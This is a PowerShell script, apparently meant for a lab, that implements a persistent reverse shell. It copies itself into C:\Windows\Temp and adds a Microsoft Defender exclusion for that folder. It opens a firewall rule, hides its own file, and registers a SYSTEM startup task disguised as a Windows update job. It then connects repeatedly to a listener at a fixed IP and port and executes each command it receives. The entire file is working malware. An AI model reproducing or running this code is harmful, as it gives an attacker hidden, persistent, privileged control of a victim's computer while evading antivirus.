# --- CONFIGURATION ---
$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Windows\Temp"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
# ---------------------

function Log-Debug {
    param([string]$Message)
    if ($DebugMode) {
        Write-Host "[DEBUG] $(Get-Date -Format 'HH:mm:ss') - $Message" -ForegroundColor Cyan
    }
}

Log-Debug "Script initialized. Debug mode is ON."

# 1. SETUP & PERSISTENCE (Runs only once or on update)
if (-not (Test-Path $WorkDir)) {
    Log-Debug "Creating working directory: $WorkDir"
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}

# SELF-COPY: The persistence task needs the file to exist at $FullPath
if ($PSCommandPath -and ($PSCommandPath -ne $FullPath)) {
    Log-Debug "Copying script to $FullPath for persistence..."
    Copy-Item -Path $PSCommandPath -Destination $FullPath -Force
}

# Add self-exclusion to Microsoft Defender
try {
    Log-Debug "Adding Defender exclusion for $WorkDir"
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
} catch {
    Log-Debug "Failed to add Defender exclusion (Requires Admin)."
}

# Add Outbound Firewall Rule for the listener port
try {
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        Log-Debug "Creating Outbound Firewall Rule for port $LPORT"
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    } else {
        Log-Debug "Firewall rule already exists."
    }
} catch {
    Log-Debug "Failed to create firewall rule."
}

# Register Scheduled Task Persistence (runs as SYSTEM at startup)
try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        Log-Debug "Registering Scheduled Task: $TaskName"
        $Arg = "-ExecutionPolicy Bypass -File $FullPath"
        if (-not $DebugMode) { $Arg = "-WindowStyle Hidden " + $Arg }
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
    } else {
        Log-Debug "Persistence task already registered."
    }
} catch {
    Log-Debug "Failed to register scheduled task."
}

# Hide the file (Only if not in debug mode)
if (Test-Path $FullPath) {
    if (-not $DebugMode) {
        Log-Debug "Hiding file with system attributes."
        attrib +h +s $FullPath
    } else {
        Log-Debug "Skipping file hiding (Debug Mode)."
    }
}

# 2. THE ENGINE (The Reverse Shell)
Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"

while ($true) {
    try {
        # Attempt connection
        Log-Debug "Attempting to connect to listener..."
        $client = New-Object System.Net.Sockets.TCPClient
        $connection = $client.BeginConnect($LHOST, $LPORT, $null, $null)
        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false) # 3 second timeout

        if (-not $wait) {
            $client.Close()
            throw "Connection timed out"
        }

        $client.EndConnect($connection)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        Log-Debug "Connected! Sending banner."
        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
        $writer.WriteLine("--- Running as: $(whoami) ---")
        $writer.WriteLine("--- Debug Mode: $DebugMode ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            
            # Read line from the stream
            $command = $reader.ReadLine()
            
            if ($null -eq $command) { 
                Log-Debug "Received null command. Closing connection."
                break 
            }
            
            $command = $command.Trim()
            if ($command -eq "exit") { 
                Log-Debug "Exit command received."
                break 
            }
            if ($command -eq "") { continue }

            Log-Debug "Executing command: $command"
            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                Log-Debug "Execution error: $($_.Exception.Message)"
                "Error: " + $_.Exception.Message
            }

            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
            $writer.Write($output)
        }
    } catch {
        Log-Debug "Connection failed ($($_.Exception.Message)). Retrying in 10s..."
        Start-Sleep -Seconds 10
    } finally {
        if ($null -ne $client) { $client.Close() }
        if ($null -ne $reader) { $reader.Close() }
        if ($null -ne $writer) { $writer.Close() }
    }
}
